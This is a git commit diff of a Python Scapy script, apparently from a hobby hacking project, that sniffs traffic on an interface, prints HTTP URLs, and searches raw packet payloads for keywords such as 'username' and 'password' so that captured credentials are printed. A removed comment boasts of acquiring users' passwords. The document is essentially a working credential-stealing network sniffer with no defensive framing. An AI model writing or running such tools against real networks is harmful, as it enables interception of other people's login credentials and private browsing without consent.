e4853cbf660b5d954b518415a0a84317d172e24f
shivamgoyal26 <officialshivamgoyal@gmail.com>
2020-01-16 16:48:44 -0500

    12thcommit

--- Packet_Sniffer.py
+++ Packet_Sniffer.py
@@ -1,26 +1,34 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
-from scapy.layers import http    # here we have imported the http package from the scapy module
+from scapy.layers import http  # here we have imported the http package from the scapy module
 
 
 def sniff(interface):
-    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ['username', 'user', 'email', 'e-mail', "Email", "pass", "password", "login"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(http.HTTPRequest):
-            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-            print(url)
+            url = get_url(packet)
+            print("[+] HTTP Request >> " + url)
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")
 
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ['username', 'user', 'email', 'e-mail', "Email", "pass", "password", "login"]
-            for keyword in keywords:
-                if keyword in load:
-                    print(load)
-                    break
 
 sniff("eth0")
-
-#here we succesfully accqiure the user passwords and the username now we want also the url of the users so let's see how we can see the url of the user
